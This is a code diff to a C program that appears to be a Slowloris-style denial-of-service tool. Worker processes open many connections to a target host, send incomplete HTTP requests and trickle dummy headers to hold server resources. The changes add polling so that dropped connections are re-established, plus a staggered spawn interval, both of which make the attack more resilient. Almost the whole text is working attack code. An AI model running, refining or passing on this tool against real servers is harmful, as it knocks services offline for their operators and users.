@@ -9,10 +9,14 @@
 #include <netdb.h>
 #include <arpa/inet.h>
 #include <fcntl.h>
+#include <poll.h>
+#include <time.h>
 
 #define BUFFER_LEN 256
 #define MSGTYPE 1
 #define QID msgget(ftok("/tmp", 'z' ), IPC_CREAT | 0666 )
+#define POLL_TIMEOUT_MS 200
+#define WORKER_SPAWN_INTERVAL_MS 50
 
 struct log {
     int worker_id;
@@ -58,6 +62,8 @@ int worker(int id, char* ip, int port, int num_connections, int interval) {
     int random_fd;
     char header[9];
     int header_index = 0;
+    struct pollfd fds[1];
+    int connected;
 
     // base http request
     // final newlines are left out so the request would not come to an end
@@ -86,6 +92,7 @@ int worker(int id, char* ip, int port, int num_connections, int interval) {
             send_message(id, "could not connect to remote host");
             break;
         }
+        connected = 1;
 
         send_message(id, "connected to remote host");
 
@@ -93,16 +100,31 @@ int worker(int id, char* ip, int port, int num_connections, int interval) {
         send_message(id, "sending initial headers...");
         send(socket_fd, base_request, strlen(base_request), 0);
 
+        // set-up socket polling
+        fds[0].fd = socket_fd;
+        fds[0].events = POLLOUT;
+
         // header feeding loop
-        while (1) {
+        while (connected) {
 
             sleep(interval);
 
-            // send header
-            send_message(id, "sending header...");
-            header_index = (header_index + 1) % 10;
-            sprintf(header, "X-%d: %d\r\n", header_index, header_index);
-            send(socket_fd, header, strlen(header), 0);
+            // poll socket
+            poll(fds, 1, POLL_TIMEOUT_MS);
+
+            // check if connection was closed
+            if (fds[0].revents & POLLHUP) {
+
+                send_message(id, "connection closed, reestablishing...");
+                connected = 0;
+            } else {
+
+                // send header
+                send_message(id, "sending header...");
+                header_index = (header_index + 1) % 10;
+                sprintf(header, "X-%d: %d\r\n", header_index, header_index);
+                send(socket_fd, header, strlen(header), 0);
+            }
         }
 
         // close previous socket
@@ -118,6 +140,7 @@ int main(int argc, char *argv[]) {
     struct msgbuf msg;
     struct log log;
     struct msqid_ds ds;
+    struct timespec ts;
     int msgrcv_result;
     int *worker_pids;
     int worker_pids_amt = 0;
@@ -132,6 +155,10 @@ int main(int argc, char *argv[]) {
     // allocate space for worker pids
     worker_pids = malloc( sizeof(int) * atoi(argv[3]) );
 
+    // prepare timespec struct for worker spawn interval
+    ts.tv_sec = WORKER_SPAWN_INTERVAL_MS / 1000;
+    ts.tv_nsec = (WORKER_SPAWN_INTERVAL_MS % 1000) * 1000000;
+
     // spawn workers
     printf("[main]: spawning workers...\n");
     for (int worker_id = 0; worker_id < atoi(argv[3]); worker_id++) {
@@ -141,8 +168,11 @@ int main(int argc, char *argv[]) {
             exit(worker(worker_id + 1, argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4])));
         } else {
             worker_pids[worker_id] = pid;
+            printf("[main]: spawned worker %d\n", worker_id + 1);
         }
 
+        // sleep for given interval
+        nanosleep(&ts, &ts);
     }
 
     // graceful exit on signal
